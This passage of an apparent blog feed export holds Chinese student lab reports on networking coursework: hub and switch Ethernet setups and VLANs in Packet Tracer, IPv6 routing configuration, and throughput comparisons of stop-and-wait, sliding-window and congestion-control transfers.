<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012190712421.png"  alt="image-20201012190712421" style="zoom: 50%;">
</li>
<li><p>连线</p>
<ul>
<li><p>本次实验使用自动连接，软件自动分配端口和选择合适种类的线，如图可知，软件选择的是直连线（适用于终端和集线器连接）</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012190937775.png"  alt="image-20201012190937775" style="zoom:50%;">

<ul>
<li>由线上绿色的三角形可知该图可以成功连通</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>配置终端ip</p>
<ul>
<li><p>单击终端，选择<code>Desktop</code>-&gt;<code>IP Configuration</code></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012191231937.png"  alt="image-20201012191231937" style="zoom:50%;">
</li>
<li><p>在<code>IPv4 Address</code>中填写IP地址，要求在==192.168.0.1到192.168.0.255==之间，点击<code>Subnet Mask</code>，自动生成子网掩码</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012191435531.png"  alt="image-20201012191435531" style="zoom:50%;">
</li>
<li><p>点击右上角的<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012191459102.png"  alt="image-20201012191459102" style="zoom:50%;">退出配置</p>
</li>
<li><p>用相同的方法配置另一个终端的IP地址，注意==IP地址不可以相同==，配置为192.168.0.2</p>
</li>
</ul>
</li>
<li><p>检测连通性</p>
<ul>
<li><p>单击其中的一个终端，选择<code>Desktop</code>-&gt;<code>Command Prompt</code>，输入<code>ping 192.168.0.x</code>(另一台pc的ip地址)</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201012191822260.png"  alt="image-20201012191822260" style="zoom: 50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014095841263.png"  alt="image-20201014095841263" style="zoom:60%;"></p>
<p>可以ping通</p>
</li>
<li><p>点击右下角的<code>simulation</code>进入仿真，在终端输入<code>ping 192.168.0.2</code></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014101317189.png"  alt="image-20201014101317189" style="zoom: 45%;">
</li>
<li><p>点击<code>play controls</code>中的<code>play</code>，可以看到信息的传递过程</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014101545565.png"  alt="image-20201014101545565" style="zoom:50%;">

</li>
</ul>
</li>
</ul>
<h4 id="第4节-实验结果"><a href="#第4节-实验结果" class="headerlink" title="第4节 实验结果"></a>第4节 实验结果</h4><ol>
<li>可以通过集线器连接至其它中终端</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014095841263.png"  alt="image-20201014095841263" style="zoom:60%;">

<ol start="2">
<li><p>消息传递仿真模拟，经过观察发现，消息在两个终端之间来回传送</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014101545565.png"  alt="image-20201014101545565" style="zoom:50%;">







</li>
</ol>
<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><h4 id="第1节-实验内容说明-2"><a href="#第1节-实验内容说明-2" class="headerlink" title="第1节 实验内容说明"></a>第1节 实验内容说明</h4><p>在仿真环境下进行==多集线器共享式==以太网组网，测试网络的连通性，并在仿真环境的“模拟”方式中观察数据包的传递过程，进行分析。</p>
<h4 id="第2节-实验准备-2"><a href="#第2节-实验准备-2" class="headerlink" title="第2节 实验准备"></a>第2节 实验准备</h4><p>Packet Tracer</p>
<h4 id="第3节-实验步骤-2"><a href="#第3节-实验步骤-2" class="headerlink" title="第3节 实验步骤"></a>第3节 实验步骤</h4><ul>
<li><p>画出网络拓扑图</p>
<ul>
<li><p>注意，终端和集线器连接使用的是直通线<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014153856913.png"  alt="image-20201014153856913" style="zoom:50%;">，而集线器之间连接使用的是交叉线<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014153917600.png"  alt="image-20201014153917600" style="zoom:50%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014153807884.png"  alt="image-20201014153807884" style="zoom: 50%;">
</li>
<li><p>用与实验二中相同的方法配置端口</p>
</li>
<li><p>在PC9的终端命令行中尝试连接PC10</p>
<ul>
<li>使用ping命令</li>
<li>仿真</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="第4节-实验结果-1"><a href="#第4节-实验结果-1" class="headerlink" title="第4节 实验结果"></a>第4节 实验结果</h4><ul>
<li><p>能够ping通</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154311950.png"  alt="image-20201014154311950" style="zoom:80%;">
</li>
<li><p>仿真结果</p>
<ol>
<li><p>PC9发送数据至Hub1</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154733483.png"  alt="image-20201014154733483" style="zoom: 50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154744108.png"  alt="image-20201014154744108" style="zoom: 50%;"></p>
</li>
<li><p>消息经过Hub1流向Hub2<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154759364.png"  alt="image-20201014154759364" style="zoom: 50%;"></p>
</li>
<li><p>信息经过Hub2流向PC10和PC11，其中PC11与数据报中的目的地址并不匹配<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154834746.png"  alt="image-20201014154834746" style="zoom:50%;"></p>
</li>
<li><p>PC10将反应消息发给Hub2<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154846259.png"  alt="image-20201014154846259" style="zoom:50%;"></p>
</li>
<li><p>消息从Hub2流向另外连接至Hub2的集线器和终端<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154905358.png"  alt="image-20201014154905358" style="zoom:50%;"></p>
</li>
<li><p>通过Hub1消息发至PC9，连接成功<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014154920190.png"  alt="image-20201014154920190" style="zoom:50%;"></p>
</li>
</ol>
</li>
</ul>
<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h4 id="第1节-实验内容说明-3"><a href="#第1节-实验内容说明-3" class="headerlink" title="第1节 实验内容说明"></a>第1节 实验内容说明</h4><p>在仿真环境下进行==交换式==以太网组网，并测试连通性</p>
<h4 id="第2节-实验准备-3"><a href="#第2节-实验准备-3" class="headerlink" title="第2节 实验准备"></a>第2节 实验准备</h4><p>Packet Tracer软件</p>
<h4 id="第3节-实验步骤-3"><a href="#第3节-实验步骤-3" class="headerlink" title="第3节 实验步骤"></a>第3节 实验步骤</h4><ul>
<li><p>画出网络拓扑图</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014125418819.png"  alt="image-20201014125418819" style="zoom:50%;">

<ul>
<li><p>使用自动连接，自动按顺序选择交换机的顺序，途中可以看到端口1-5已经开启</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014125724887.png"  alt="image-20201014125724887" style="zoom:50%;">



</li>
</ul>
</li>
</ul>
<ul>
<li><p>为PC1-PC6分配IP地址<code>192.168.0.1</code>-<code>192.168.0.2</code></p>
</li>
<li><p>配置交换机</p>
<ul>
<li><p>利用终端控制台进行配置</p>
<ul>
<li><p>添加交换机的控制终端，用<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014125543161.png"  alt="image-20201014125543161" style="zoom:50%;">PC0的RS232端口连接至Switch0的console端口</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014125001719.png"  alt="image-20201014125001719" style="zoom:50%;">

</li>
</ul>
<ul>
<li><p>点击PC0-&gt;<code>Desktop</code>-&gt;<code>Terminal</code>，设置为9600波特、8个数据位、1个停止位</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014161530424.png"  alt="image-20201014161530424" style="zoom:50%;">
</li>
<li><p>可以使用命令<code>show mac-address-table</code>，<code>config terminal</code>配置计算机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vlan database ## 进入交换机的VLAN数据库维护模式</span><br><span class="line">Vlan 2 name VLAN2 ## 建立编号位2，名字位VLAN2的VLAN</span><br><span class="line">exit ## 退出VLAN数据库维护模式</span><br><span class="line">config terminal ## 进入配置中终端模式</span><br><span class="line">interface Fa0&#x2F;1 ## 通知交换机配置端口号1</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 2 #把交换机端口1分配给VLAN2</span><br><span class="line">show vlan</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>利用设备配置界面进行配置</p>
<ul>
<li><p>添加虚拟网络</p>
<ul>
<li>单击交换机-&gt;<code>config</code>，添加VLAN2和VLAN3</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014130104630.png"  alt="image-20201014130104630" style="zoom:50%;">

<ul>
<li>配置端口与虚拟网络的对应关系<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014130248990.png"  alt="image-20201014130248990" style="zoom:40%;"></li>
<li>配置为PC1、PC2、PC5、PC6连接至VLAN2范围内的端口，PC3、PC4连接至VLAN3范围内的端口</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>测试连通性，方法同上个实验，在PC终端使用ping命令</p>
</li>
<li><p>打开仿真模式，测试处在相同虚拟网络和不同虚拟网络之间终端的连通性</p>
</li>
</ul>
<h4 id="第4节-实验结果-2"><a href="#第4节-实验结果-2" class="headerlink" title="第4节 实验结果"></a>第4节 实验结果</h4><ul>
<li><p>PC1连接PC5，连接成功</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014130730333.png"  alt="image-20201014130730333" style="zoom:50%;">

<ol>
<li><p>PC1发送信息至交换机</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132313689.png"  alt="image-20201014132313689" style="zoom:40%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132401107.png"  alt="image-20201014132401107" style="zoom:33%;"></p>
</li>
<li><p>交换机向处在同一个VLAN（VLAN2）内的终端发送信息，由终端辨认目的地址是否吻合</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132527412.png"  alt="image-20201014132527412" style="zoom:33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132604425.png"  alt="image-20201014132604425" style="zoom:33%;"></p>
</li>
<li><p>消息在同一个VLAN内继续传播</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132709727.png"  alt="image-20201014132709727" style="zoom:33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014132741993.png"  alt="image-20201014132741993" style="zoom:33%;"></p>
</li>
</ol>
</li>
</ul>
<ol start="4">
<li>PC1接收到PC5传回来的信息，显示ping通</li>
</ol>
<pre><code>&lt;img src=&quot;/images/大三上/网技/第一次实验/image-20201014132840869.png&quot; alt=&quot;image-20201014132840869&quot; style=&quot;zoom:33%;&quot; /&gt;</code></pre><ul>
<li><p>PC1连接PC3，连接失败</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014131443202.png"  alt="image-20201014131443202" style="zoom:50%;">

<ol>
<li>PC1发送信息至交换机</li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014151952875.png"  alt="image-20201014151952875" style="zoom: 33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014152042751.png"  alt="image-20201014152042751" style="zoom:33%;"></p>
<ol start="2">
<li><p>交换机将消息发送给相同VLAN内的终端</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014152325818.png"  alt="image-20201014152325818" style="zoom:33%;">
</li>
<li><p>交换机不能向PC3和PC4发送消息</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014152453649.png"  alt="image-20201014152453649" style="zoom:33%;">
</li>
<li><p>数据报不断在线路内传递，始终不能传递至正确位置，PC1也不能收到正确的返回数据报</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第一次实验/image-20201014152623214.png"  alt="image-20201014152623214" style="zoom:80%;"></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>wpcap</tag>
        <tag>packettracer</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>网络技术与应用作业六 IPv6组网与配置</title>
    <url>/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="验证性实验（4）IPv6组网与配置"><a href="#验证性实验（4）IPv6组网与配置" class="headerlink" title="验证性实验（4）IPv6组网与配置"></a>验证性实验（4）IPv6组网与配置</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>IPv6组网与配置在虚拟仿真环境下进行，要求如下：</p>
<p>（1）能对IPv6地址段进行合理划分。</p>
<p>（2）能正确配置路由器的IP地址和路由表。</p>
<p>（3）能利用手工或自动获取方式正确配置主机的IPv6地址。</p>
<p>（4）通过网络连通性测试。</p>
<p>（5）在仿真环境的“模拟”方式中观察IPv6数据报传递过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p><strong>拓扑图</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229205233327.png"  alt="image-20201229205233327"></p>
<p><strong>IPv6地址配置</strong></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229212002405.png"  alt="image-20201229212002405" style="zoom:50%;">



<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ul>
<li><p>根据上图所示<strong>静态</strong>设置四个终端的IPV6地址和默认网关（原理同IPv4）</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229205734956.png"  alt="image-20201229205734956"></p>
</li>
<li><p>配置路由器，这里以左边的Router2为例</p>
<ul>
<li><p>打开CLI</p>
</li>
<li><p>配置路由器IP </p>
<ul>
<li>接口0/0对应IP 2001:1::2/64</li>
<li>接口0/1对应IP 2001:2::2/64</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229205933426.png"  alt="image-20201229205933426" style="zoom:67%;">
</li>
</ul>
</li>
<li><p>配置路由表</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229210134817.png"  alt="image-20201229210134817" style="zoom:67%;"></li>
</ul>
</li>
<li><p>打开允许转发单播消息</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229210220431.png"  alt="image-20201229210220431"></li>
</ul>
</li>
<li><p>查看路由表</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229210252151.png"  alt="image-20201229210252151" style="zoom:67%;"></li>
<li>其中，表项<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229210303517.png"  alt="image-20201229210303517">即为刚刚配置的表项</li>
</ul>
</li>
<li><p>另外一个路由器的配置类似，只是IP地址和路由表投递的地址有变化但原理一致</p>
</li>
</ul>
</li>
<li><p>修改终端IPv6的分配方法为<strong>动态分配</strong>，即可利用自动获取方式正确配置主机的IPv6地址</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229210504472.png"  alt="image-20201229210504472"></li>
</ul>
</li>
</ul>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="静态实验"><a href="#静态实验" class="headerlink" title="静态实验"></a>静态实验</h3><p>PC0 ping PC2</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E7%BD%91%E6%8A%80/%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20201229211401460.png"  alt="image-20201229211401460"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229211421610.png"  alt="image-20201229211421610" style="zoom:70%;">

<h3 id="动态实验"><a href="#动态实验" class="headerlink" title="动态实验"></a>动态实验</h3><ol>
<li>IPv6的获取</li>
</ol>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229211653973.png"  alt="image-20201229211653973" style="zoom:67%;">

<ol start="2">
<li><p>ping</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/网技/第六次实验/image-20201229211739339.png"  alt="image-20201229211739339" style="zoom: 67%;">

<p>成功</p>
</li>
</ol>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>packettracer</tag>
        <tag>大三上学期课程内容</tag>
        <tag>网络技术与应用</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业3-4 性能对比实验</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="任务3-4：性能对比实验"><a href="#任务3-4：性能对比实验" class="headerlink" title="任务3-4：性能对比实验"></a>任务3-4：性能对比实验</h1><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>（1）停等机制与滑动窗口机制性能对比；</p>
<p>（2）滑动窗口机制中不同窗口大小对性能的影响；</p>
<p>（3）有拥塞控制和无拥塞控制的性能比较。</p>
<p><strong>本次实验的数据都是经过三次测试之后取的平均值</strong></p>
<p><strong>表格中的内容为吞吐率大小，单位Kbps</strong></p>
<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>网络环境不是单一维度，不应该只用“好”和“坏”区分，所以本次实验采用控制变量的方法，分别测试“<strong>丢包</strong>”和“<strong>时延</strong>”对不同机制的影响。通过实验发现，不同的机制对于“时延”和“丢包”有不同的效率表现。</p>
<hr>
<h3 id="（1）停等机制与滑动窗口机制性能对比"><a href="#（1）停等机制与滑动窗口机制性能对比" class="headerlink" title="（1）停等机制与滑动窗口机制性能对比"></a>（1）停等机制与滑动窗口机制性能对比</h3><h4 id="延时为0，改变丢包率"><a href="#延时为0，改变丢包率" class="headerlink" title="延时为0，改变丢包率"></a>延时为0，改变丢包率</h4><table>
<thead>
<tr>
<th>机制</th>
<th>丢包率 0%</th>
<th>1%</th>
<th>2%</th>
<th>3%</th>
<th>4%</th>
<th>5%</th>
</tr>
</thead>
<tbody><tr>
<td>停等</td>
<td>960.825</td>
<td>152.114</td>
<td>125.517</td>
<td>103.731</td>
<td>91.1767</td>
<td>79.642</td>
</tr>
<tr>
<td>滑动窗口（GBN）</td>
<td>1044.26</td>
<td>343.323</td>
<td>198.482</td>
<td>136.259</td>
<td>93.7098</td>
<td>69.5384</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225225948428.png"  alt="image-20201225225948428" style="zoom:40%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230016217.png"  alt="image-20201225230016217" style="zoom:40%;"></p>
<h4 id="丢包为0，改变延时"><a href="#丢包为0，改变延时" class="headerlink" title="丢包为0，改变延时"></a>丢包为0，改变延时</h4><table>
<thead>
<tr>
<th>机制</th>
<th>延时0ms</th>
<th>50ms</th>
<th>100ms</th>
<th>150ms</th>
<th>200ms</th>
<th>250ms</th>
</tr>
</thead>
<tbody><tr>
<td>停等</td>
<td>960.825</td>
<td>122.832</td>
<td>47.02</td>
<td>36.1274</td>
<td>28.8211</td>
<td>25.0782</td>
</tr>
<tr>
<td>滑动窗口（GBN）</td>
<td>1044.26</td>
<td>126.833</td>
<td>70.5729</td>
<td>49.8144</td>
<td>38.5412</td>
<td>31.393</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230232560.png"  alt="image-20201225230232560" style="zoom:33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230256207.png"  alt="image-20201225230256207" style="zoom:30%;"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
<li>大体上滑动窗口机制比停等机制的效率更高<ul>
<li>滑动窗口机制允许发送多条消息，同时等待对方回复的ACK，减少RTT的影响</li>
</ul>
</li>
<li>在有延时的情况下，GBN表现更好<ul>
<li>原因同上，停等机制需要每条消息单独等待时延和RTT，而窗口可以同时等待多条</li>
</ul>
</li>
<li>丢包率大时GBN效率比停低<ul>
<li>更大的窗口意味着更高的重传代价，大大降低性能</li>
</ul>
</li>
</ul>
<h3 id="（2）滑动窗口机制中不同窗口大小对性能的影响"><a href="#（2）滑动窗口机制中不同窗口大小对性能的影响" class="headerlink" title="（2）滑动窗口机制中不同窗口大小对性能的影响"></a>（2）滑动窗口机制中不同窗口大小对性能的影响</h3><h4 id="延时为0，改变丢包率-1"><a href="#延时为0，改变丢包率-1" class="headerlink" title="延时为0，改变丢包率"></a>延时为0，改变丢包率</h4><table>
<thead>
<tr>
<th>窗口大小</th>
<th>丢包率 0%</th>
<th>1%</th>
<th>2%</th>
<th>3%</th>
<th>4%</th>
<th>5%</th>
</tr>
</thead>
<tbody><tr>
<td>6</td>
<td>1022.322</td>
<td>264.897</td>
<td>168.695</td>
<td>140.271</td>
<td>114.535</td>
<td>90.6781</td>
</tr>
<tr>
<td>10</td>
<td>1044.26</td>
<td>343.323</td>
<td>198.482</td>
<td>136.259</td>
<td>93.7098</td>
<td>69.5384</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225221955857.png"  alt="image-20201225221955857" style="zoom:45%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225225948428.png"  alt="image-20201225225948428" style="zoom:40%;"></p>
<h4 id="丢包为0，改变延时-1"><a href="#丢包为0，改变延时-1" class="headerlink" title="丢包为0，改变延时"></a>丢包为0，改变延时</h4><table>
<thead>
<tr>
<th>窗口大小</th>
<th>延时0ms</th>
<th>50ms</th>
<th>100ms</th>
<th>150ms</th>
<th>200ms</th>
<th>250ms</th>
</tr>
</thead>
<tbody><tr>
<td>6</td>
<td>1022.32</td>
<td>125.453</td>
<td>65.6478</td>
<td>45.2397</td>
<td>35.629</td>
<td>29.7989</td>
</tr>
<tr>
<td>10</td>
<td>1044.26</td>
<td>126.833</td>
<td>70.5729</td>
<td>49.8144</td>
<td>38.5412</td>
<td>31.393</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230317231.png"  alt="image-20201225230317231" style="zoom:30%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230331945.png"  alt="image-20201225230331945" style="zoom:30%;"></p>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><ul>
<li><p>不同窗口大小在不同网络环境下的效率变化总体上区域一致</p>
</li>
<li><p>在网络<strong>情况较好</strong>的时候<strong>窗口大的效率更高</strong></p>
<ul>
<li>因为更大的窗口可以允许同时发送更多条消息并同时等待对方的ACK，即减少等待的周期数，更好的应对时延问题。</li>
</ul>
</li>
<li><p>对于丢包问题，当丢包率较高时由于大的窗口会<strong>增加重传代价</strong>，效率降低</p>
</li>
</ul>
<h3 id="（3）有拥塞控制和无拥塞控制的性能比较"><a href="#（3）有拥塞控制和无拥塞控制的性能比较" class="headerlink" title="（3）有拥塞控制和无拥塞控制的性能比较"></a>（3）有拥塞控制和无拥塞控制的性能比较</h3><h4 id="延时为0，改变丢包率-2"><a href="#延时为0，改变丢包率-2" class="headerlink" title="延时为0，改变丢包率"></a>延时为0，改变丢包率</h4><table>
<thead>
<tr>
<th>是否有拥塞控制</th>
<th>丢包率 0%</th>
<th>1%</th>
<th>2%</th>
<th>3%</th>
<th>4%</th>
<th>5%</th>
</tr>
</thead>
<tbody><tr>
<td>是</td>
<td>1300.11</td>
<td>402.673</td>
<td>201.129</td>
<td>129.408</td>
<td>99.187</td>
<td>80.806</td>
</tr>
<tr>
<td>否</td>
<td>1044.26</td>
<td>343.323</td>
<td>198.482</td>
<td>136.259</td>
<td>93.7098</td>
<td>69.5384</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225232105535.png"  alt="image-20201225232105535" style="zoom:40%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225232141167.png"  alt="image-20201225232141167" style="zoom:40%;"></p>
<h4 id="丢包为0，改变延时-2"><a href="#丢包为0，改变延时-2" class="headerlink" title="丢包为0，改变延时"></a>丢包为0，改变延时</h4><table>
<thead>
<tr>
<th>是否有拥塞控制</th>
<th>延时0ms</th>
<th>50ms</th>
<th>100ms</th>
<th>150ms</th>
<th>200ms</th>
<th>250ms</th>
</tr>
</thead>
<tbody><tr>
<td>是</td>
<td>1021.178</td>
<td>109.642</td>
<td>69.5348</td>
<td>46.711</td>
<td>40.013</td>
<td>36.909</td>
</tr>
<tr>
<td>否</td>
<td>1044.26</td>
<td>126.833</td>
<td>70.5729</td>
<td>49.8144</td>
<td>38.5412</td>
<td>31.393</td>
</tr>
</tbody></table>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225232557209.png"  alt="image-20201225232557209" style="zoom:40%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-4/image-20201225230413873.png"  alt="image-20201225230413873" style="zoom:30%;"></p>
<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><ul>
<li>在网络情况良好时，有拥塞控制相对于没有拥塞控制效率更高<ul>
<li>因为拥塞控制可以允许有更大的窗口</li>
<li>快速重传机制也可以减少等待超时重传的次数。</li>
</ul>
</li>
<li>当网络情况逐渐变差时，拥塞控制机制表现可能并不比没有拥塞控制好<ul>
<li>频繁缩小窗口导致窗口较小，小于没有拥塞控制机制的设定值，导致受时延的影响较大</li>
</ul>
</li>
<li>实验过程中也发现，当网络情况变得更差时，拥塞控制机制可能使窗口由几百突然降至1，并进入重传，使得重传代价飞速增加。</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业3-3 拥塞控制算法</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-3/</url>
